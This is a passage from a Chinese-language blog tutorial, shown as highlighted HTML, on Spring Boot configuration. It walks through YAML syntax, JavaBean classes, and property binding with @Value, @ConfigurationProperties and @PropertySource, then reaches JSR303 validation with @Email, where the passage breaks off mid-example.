title="语法特点"></a>语法特点</h3><ul><li>大小写敏感</li><li>和python类似，使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要同级元素左对齐即可</li><li><code>#</code>表示注释</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>对象：键值对的集合，又称为映射，哈希，字典</li><li>数组：一组按次序排列的元素</li><li>纯量：实际上就是普通的单一变量</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment">#对象的用法</span><span class="token key atrule">Person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> Azusa  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">16</span>  <span class="token comment">#子对象</span>  <span class="token key atrule">Dog</span><span class="token punctuation">:</span>      <span class="token key atrule">name</span><span class="token punctuation">:</span> Gino      <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token comment">#数组用法,下面例子表示Human:["YourName","YourAge","Nothing"]</span><span class="token key atrule">Human</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> YourName    <span class="token punctuation">-</span> YourAge    <span class="token punctuation">-</span> Nothing<span class="token comment">#或者</span><span class="token key atrule">Human2</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">]</span><span class="token comment">#字成员用法 A:[1,2,[1,2,3]]</span><span class="token key atrule">A</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span>  <span class="token punctuation">-</span>    <span class="token punctuation">-</span> <span class="token number">1</span>    <span class="token punctuation">-</span> <span class="token number">2</span>    <span class="token punctuation">-</span> <span class="token number">3</span><span class="token comment">#还有复杂一点的用法，companies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><span class="token key atrule">companies</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company1    <span class="token key atrule">price</span><span class="token punctuation">:</span> 200w  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company2    <span class="token key atrule">price</span><span class="token punctuation">:</span> 300w<span class="token comment">#复合结构</span><span class="token key atrule">languages</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> ruby  <span class="token punctuation">-</span> perl  <span class="token punctuation">-</span> python<span class="token key atrule">websites</span><span class="token punctuation">:</span>  <span class="token key atrule">Yaml</span><span class="token punctuation">:</span> yaml.org  <span class="token key atrule">ruby</span><span class="token punctuation">:</span> ruby.org  <span class="token key atrule">python</span><span class="token punctuation">:</span> python.org<span class="token comment">#纯量包括：字符串，布尔值，整数，浮点数，Null，时间，日期</span><span class="token key atrule">boolean</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token boolean important">TRUE</span> <span class="token comment">#或者true，这里的true就是纯量</span>  <span class="token punctuation">-</span> <span class="token boolean important">FALSE</span><span class="token key atrule">float</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">3.14</span> <span class="token comment">#3.14也是纯量，纯量的意思就是一些常量</span>  <span class="token punctuation">-</span> <span class="token number">1.1415</span><span class="token key atrule">int</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span><span class="token key atrule">null</span><span class="token punctuation">:</span>  <span class="token key atrule">nodename</span><span class="token punctuation">:</span> <span class="token string">'node'</span>  <span class="token key atrule">parent</span><span class="token punctuation">:</span> <span class="token null important">~</span> <span class="token comment">#使用~表示null</span><span class="token key atrule">string</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> 哈哈  <span class="token punctuation">-</span> hello  <span class="token punctuation">-</span> <span class="token string">"hello"</span> <span class="token comment">#加不加引号都无所谓</span><span class="token key atrule">data</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12</span> <span class="token comment">#日期必须以yyyy-MM-dd的格式</span><span class="token key atrule">datatime</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12T15:02:31+08:00</span> <span class="token comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="给属性赋值的几种方式"><a href="#给属性赋值的几种方式" class="headerlink" title="给属性赋值的几种方式"></a>给属性赋值的几种方式</h2><h3 id="传统派：Value赋值"><a href="#传统派：Value赋值" class="headerlink" title="传统派：Value赋值"></a>传统派：Value赋值</h3><p>使用<code>@Componet</code>注解<strong>表明这个类是一个bean</strong>，不用像SpringMVC那样去xml写<code>&lt;bean id=&quot;&quot; class=&quot;&quot;&gt;</code></p><blockquote><p>JavaBean是一种Java类，而且是一种特殊的、可重用的类：必须具有无参数的构造器，所有的属性都是private的，通过提供setter和getter方法来实现对成员属性的访问，需要被序列化并且实现了 Serializable 接口，bean的示例如下：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentsBean</span> <span class="token keyword">implements</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>Serializable</span><span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> firstName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> lastName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">StudentsBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstName</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLastName</span><span class="token punctuation">(</span><span class="token class-name">String</span> lastName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在SpringBoot中只需要用注解<code>@Component</code>，然后就能开始写bean类了</p><blockquote><p>tips：IDEA中，alt+insert可以快速生成构造函数，getter，setter等方法</p></blockquote><p>写一个Cat类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Cat&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再写一个Person类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>context<span class="token punctuation">.</span>properties<span class="token punctuation">.</span></span><span class="token class-name">ConfigurationProperties</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> birth<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">,</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">,</span> <span class="token class-name">Date</span> birth<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">,</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">getHappy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHappy</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span> happy<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getBirth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBirth</span><span class="token punctuation">(</span><span class="token class-name">Date</span> birth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMaps</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getLists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLists</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span> <span class="token function">getCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCat</span><span class="token punctuation">(</span><span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", happy="</span> <span class="token operator">+</span> happy <span class="token operator">+</span>                <span class="token string">", birth="</span> <span class="token operator">+</span> birth <span class="token operator">+</span>                <span class="token string">", maps="</span> <span class="token operator">+</span> maps <span class="token operator">+</span>                <span class="token string">", lists="</span> <span class="token operator">+</span> lists <span class="token operator">+</span>                <span class="token string">", cat="</span> <span class="token operator">+</span> cat <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后可以在Cat类里面添加<code>@Value</code>注解来赋值，需要一个个属性指定来进行赋值</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708190439958.png" alt="image-20240708190439958"></p><hr><h3 id="Yaml配置文件绑定"><a href="#Yaml配置文件绑定" class="headerlink" title="Yaml配置文件绑定"></a>Yaml配置文件绑定</h3><p>在resources文件夹下创建application.yaml：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> 0w0  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">happy</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">birth</span><span class="token punctuation">:</span> 2024/07/09  <span class="token key atrule">maps</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token key atrule">k1</span><span class="token punctuation">:</span> v1<span class="token punctuation">,</span><span class="token key atrule">k2</span><span class="token punctuation">:</span> v2<span class="token punctuation">&#125;</span>  <span class="token key atrule">lists</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> code    <span class="token punctuation">-</span> game    <span class="token punctuation">-</span> music  <span class="token key atrule">cat</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> kitty    <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在Person.java中添加<code>@ConfigurationProperties(prefix = &quot;person&quot;)</code>注解把yaml配置文件绑定上去</p><blockquote><p>@ConfigurationProperties：将配置文件中配置的每一个属性的值，映射到这个组件中；参数<code>prefix</code>将配置文件中的所有属性进行一一对应</p></blockquote><p>和<code>@Value</code>的区别：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004523248.png" alt="image-20240709004523248"></p><blockquote><p>松散绑定：yaml中<code>last-name</code>和<code>lastName</code>是一样的，<code>-</code>后跟着的字母默认是大写的</p></blockquote><p>实例：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002814400.png" alt="image-20240709002814400"></p><p>接下来用test文件夹下的DemoApplicationTests进行测试打印，使用<code>@Autowired</code>注解，即自动装配</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002908085.png" alt="image-20240709002908085"></p><p>成功打印出来</p><p>注意：yaml配置文件可以插入<strong>el表达式</strong></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004217315.png" alt="image-20240709004217315"></p><hr><h3 id="Properties配置文件绑定"><a href="#Properties配置文件绑定" class="headerlink" title="Properties配置文件绑定"></a>Properties配置文件绑定</h3><p>这种方式和yaml差不多，都是通过配置文件进行指定</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">name</span><span class="token punctuation">=</span><span class="token value attr-value">0w0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Person.java使用<code>@PropertySource</code>注解来加载指定的配置文件</p><p>然后用<code>@Value(&quot;$&#123;name&#125;&quot;)</code>这个SPEL表达式来取出配置文件的值</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709003745075.png" alt="image-20240709003745075"></p><hr><h2 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h2><blockquote><p>在字段中增加一层过滤器验证，保证数据的合法性</p></blockquote><p>SpringBoot中用<code>@Validated</code>来校验数据，如果数据异常则会统一抛出异常，方便异常中心统一处理</p><p>引入依赖：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>jakarta.validation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jakarta.validation-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>tips：如果安装依赖出现<code>connect timeout</code>的建议直接在maven下的conf&#x2F;setting.xml里添加代理，参考：<a href="https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/">https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</a></p></blockquote><p>这里写一个注解让name只能支持Email格式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Validated</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Email</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们继续传入前面的name时就会报错</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709163549439.png" alt="image-20240709163549439"></p><p>跟进一下<code>@Email</code></p><pre class="line-numbers language-java" data-language="java"><code 